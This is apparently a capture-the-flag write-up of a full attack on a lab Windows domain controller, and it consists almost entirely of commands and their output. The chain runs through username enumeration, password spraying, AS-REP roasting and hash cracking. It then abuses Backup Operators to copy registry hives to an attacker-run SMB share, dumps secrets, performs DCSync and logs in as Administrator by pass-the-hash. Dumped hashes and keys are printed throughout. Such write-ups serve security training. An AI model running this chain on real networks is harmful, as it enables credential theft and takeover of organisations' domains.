# DC02

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.72:53
Open 10.0.2.72:88
Open 10.0.2.72:135
Open 10.0.2.72:139
Open 10.0.2.72:389
Open 10.0.2.72:445
Open 10.0.2.72:464
Open 10.0.2.72:593
Open 10.0.2.72:3268
Open 10.0.2.72:5985
Open 10.0.2.72:9389
Open 10.0.2.72:49664
Open 10.0.2.72:49668
Open 10.0.2.72:49677
Open 10.0.2.72:49710
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.72

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-10-04 08:27:02Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49710/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 10h59m58s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 17343/tcp): CLEAN (Timeout)
|   Check 2 (port 51287/tcp): CLEAN (Timeout)
|   Check 3 (port 58388/udp): CLEAN (Timeout)
|   Check 4 (port 32501/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-10-04T08:27:51
|_  start_date: N/A
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:0d:88:c9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   DC01<00>             Flags: <unique><active>
|   SOUPEDECODE<00>      Flags: <group><active>
|   SOUPEDECODE<1c>      Flags: <group><active>
|   DC01<20>             Flags: <unique><active>
|   SOUPEDECODE<1b>      Flags: <unique><active>
| Statistics:
|   08:00:27:0d:88:c9:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
:::

## SMB

### Test

No potential to enumerate users...
```bash
└─$ netexec smb soupedecode.local -u '' -p '' --shares
SMB         10.0.2.72       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.72       445    DC01             [-] SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED
SMB         10.0.2.72       445    DC01             [-] Error enumerating shares: Error occurs while reading from remote(104)

└─$ netexec smb soupedecode.local -u 'guest' -p '' --shares
SMB         10.0.2.72       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.72       445    DC01             [-] SOUPEDECODE.LOCAL\guest: STATUS_ACCOUNT_DISABLED

└─$ netexec smb soupedecode.local -u 'anonymous' -p '' --shares
SMB         10.0.2.72       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.72       445    DC01             [-] SOUPEDECODE.LOCAL\anonymous: STATUS_LOGON_FAILURE
```

### Kerbrute

```bash
└─$ kerbrute userenum -d soupedecode.local --dc 10.0.2.72 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | tee userenum.log
2025/10/03 17:33:14 >  [+] VALID USERNAME:       admin@soupedecode.local
2025/10/03 17:33:14 >  [+] VALID USERNAME:       charlie@soupedecode.local
2025/10/03 17:33:14 >  [+] VALID USERNAME:       Charlie@soupedecode.local
2025/10/03 17:33:14 >  [+] VALID USERNAME:       administrator@soupedecode.local
2025/10/03 17:33:14 >  [+] VALID USERNAME:       Admin@soupedecode.local
2025/10/03 17:33:19 >  [+] VALID USERNAME:       Administrator@soupedecode.local
2025/10/03 17:33:19 >  [+] VALID USERNAME:       CHARLIE@soupedecode.local
2025/10/03 17:33:41 >  [+] VALID USERNAME:       ADMIN@soupedecode.local
2025/10/03 17:38:22 >  [+] VALID USERNAME:       wreed11@soupedecode.local
```

```bash
└─$ grep VALID userenum.log | cut -d' ' -f8 | cut -d'@' -f1 | tr 'A-Z' 'a-z' | sort -u | tee users.txt
admin
administrator
charlie
wreed11
```

```bash
└─$ netexec smb soupedecode.local -u users.txt -p users.txt --continue-on-success --no-bruteforce
SMB         10.0.2.72       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.72       445    DC01             [-] SOUPEDECODE.LOCAL\admin:admin STATUS_LOGON_FAILURE
SMB         10.0.2.72       445    DC01             [-] SOUPEDECODE.LOCAL\administrator:administrator STATUS_LOGON_FAILURE
SMB         10.0.2.72       445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie
SMB         10.0.2.72       445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE
```

### More Users

```bash
└─$ netexec smb soupedecode.local -u charlie -p charlie | tee rid_brute.log

└─$ grep SidTypeUser rid_brute.log | awk '{split($6, a, "\\"); print(a[2])}' | tee users2.txt | tail
PC-82$
PC-83$
PC-84$
PC-85$
PC-86$
PC-87$
PC-88$
PC-89$
PC-90$
admin

└─$ netexec smb soupedecode.local -u users2.txt -p users2.txt --continue-on-success --no-bruteforce | grep -v FAILURE
SMB                      10.0.2.72       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB                      10.0.2.72       445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie
```

### Kerberoasting

```bash
└─$ sudo ntpdate soupedecode.local
[sudo] password for woyag:
2025-10-04 04:52:53.247878 (-0400) +39598.620579 +/- 0.000417 soupedecode.local 10.0.2.72 s1 no-leap
CLOCK: time stepped by 39598.620579

└─$ echo $(( 39598.620579 / 60 / 60 ))
10.999616827500001

└─$ faketime -f +11h netexec ldap soupedecode.local -u 'charlie' -p 'charlie' --kerberoasting roasted.txt
LDAP        10.0.2.72       389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.0.2.72       389    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie
LDAP        10.0.2.72       389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.0.2.72       389    DC01             [*] Total of records returned 0
```

### ASREPRoast

```bash
└─$ faketime -f +11h netexec ldap soupedecode.local -u 'charlie' -p 'charlie' --asreproast roasted.txt
LDAP        10.0.2.72       389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.0.2.72       389    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie
LDAP        10.0.2.72       389    DC01             [*] Total of records returned 1
LDAP        10.0.2.72       389    DC01             $krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:06799ce9d9fd552bf52c9082a9ff4f8e$89479ada7b58a4e0d5194dbb54b276f015640b624f40909ecf9269ca1295dfa2d5709945bc595ce556ea0f922aebaa33d0d3dd9a5cee8868c865c2a42b72da01f6490f2c81f356818187c835d5dd1e765cc3aa6ce88a1f67e4f76835c42d1701e91e9938828e21cce294eb6269c24af7c16805d144b3bcd16c77ded6a1607952484eb58fd2a35ff421e9cc4d9c5b71a6260c42bd645a6a5b1af09572e90064e673bba3f7574de8afadc87c4d0b5cb8dd72e31f932e2ee0c928f54d626972b75977bc30b8198fe8afc58c1bb76c661b46bc92f93bba29d9332b5053e01ed4b8ae669bdd2241a065ad30ccc2de6a297d2f76c033383691
```

```powershell
➜ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
internet         ($krb5asrep$23$zximena448@SOUPEDECODE.LOCAL)
```

## Lateral Movement

### Backup Operators

- [https://www.thehacker.recipes/ad/movement/builtins/security-groups#security-groups](https://www.thehacker.recipes/ad/movement/builtins/security-groups#security-groups)
	- [https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)

```bash
└─$ powerview 'soupedecode.local'/'zximena448':'internet'@'10.0.2.72'
[2025-10-03 18:02:41] User zximena448 has adminCount attribute set to 1. Might be admin somewhere somehow :)
(LDAP)-[DC01.SOUPEDECODE.LOCAL]-[SOUPEDECODE\zximena448]
PV > Get-DomainUser zximena448
cn                                : Zach Ximena
description                       : Volunteer teacher and education advocate
distinguishedName                 : CN=Zach Ximena,CN=Users,DC=SOUPEDECODE,DC=LOCAL
memberOf                          : CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL
name                              : Zach Ximena
objectGUID                        : {0299bb59-ee9e-4284-a10f-13c2273e9d23}
userAccountControl                : NORMAL_ACCOUNT [4260352]
                                    DONT_EXPIRE_PASSWORD
                                    DONT_REQ_PREAUTH
badPwdCount                       : 0
badPasswordTime                   : 04/10/2025 08:51:52 (today)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 04/10/2025 08:54:47 (today)
pwdLastSet                        : 17/06/2024 18:09:53 (1 year, 3 months ago)
primaryGroupID                    : 513
objectSid                         : S-1-5-21-2986980474-46765180-2505414164-1142
adminCount                        : 1
sAMAccountName                    : zximena448
sAMAccountType                    : SAM_USER_OBJECT
userPrincipalName                 : zximena448@soupedecode.local
objectCategory                    : CN=Person,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
mail                              : zximena448@soupedecode.local
```

```bash
# Term 1
└─$ impacket-smbserver share . -smb2support
---
# Term 2
└─$ impacket-reg 'soupedecode.local'/'zximena448':'internet'@'10.0.2.72' backup -o '\\10.0.2.15\share'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\10.0.2.15\share\SAM.save
[*] Saved HKLM\SYSTEM to \\10.0.2.15\share\SYSTEM.save
[*] Saved HKLM\SECURITY to \\10.0.2.15\share\SECURITY.save
```

### Secrets Dump

The hives contain passwords for local users, not domain users.
```bash
└─$ impacket-secretsdump -system ./SYSTEM.save -security ./SECURITY.save -sam SAM.save LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:a1ca166471adef708d2b1ca783e1013f06dfbfe7f55b7df1bc4efadb47ac584b45496beba39550ea9dfca2da4a4c97f891f29eb2ee0b670ac6678523d86e018f1c25873882e0c87c17ec3e987534209be9542124dae5ee6a8db3fae67c7edcff963ab6b9620cb6f4f9a83ebd0c392ae8bf4e64c6fae49abbfb266f1616e0c86ce57b0cc3c57bdb37cbf6f58bfc8a76e1f3636b13bf0c87019817df53b23bf345f9afa8fca70862b6407853dc4142f57c66c3c9760e08a8d3ad8c1989d10847a81acda8de02b39163ab47909471f365d6f7211eb9aa8fc6cb3e4e4e2f3f7a6a68ae9935ace5c2409461380677ff1442cf
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:489818c9f3abbebaa4ba5b8e0a90b2b1
[*] DPAPI_SYSTEM
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Cleaning up...
```

The `MACHINE.ACC` has is for `DC01`
```bash
└─$ netexec smb soupedecode.local -u 'DC01$' -H 489818c9f3abbebaa4ba5b8e0a90b2b1
SMB         10.0.2.72       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.2.72       445    DC01             [+] SOUPEDECODE.LOCAL\DC01$:489818c9f3abbebaa4ba5b8e0a90b2b1
```

```bash
└─$ impacket-secretsdump 'soupedecode.local'/'DC01$'@'10.0.2.72' -hashes ':489818c9f3abbebaa4ba5b8e0a90b2b1' -just-dc-user Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:01dc1e0f079f2dfe4a880156b7192acc658b8733cc87f1c5be32c291ad8e0318
Administrator:aes128-cts-hmac-sha1-96:4b4cf4064e92346339b1a3ef3ff65d6b
Administrator:des-cbc-md5:b0614357f8160ef4
[*] Cleaning up...
```

> Creds: `Administrator:8982babd4da89d33210779a6c5b078bd`

## Flags

```bash
└─$ evil-winrm -i soupedecode.local -u 'Administrator' -H '8982babd4da89d33210779a6c5b078bd'
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
soupedecode\administrator
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users -Recurse -File -Filter *.txt | % { echo $_.FullName; cat $_.FullName; echo ""; }
C:\Users\Administrator\Desktop\root.txt
d41d8cd98f00b204e9800998ecf8427e

C:\Users\zximena448\Desktop\user.txt
2fe79eb0e02ecd4dd2833cfcbbdb504c
```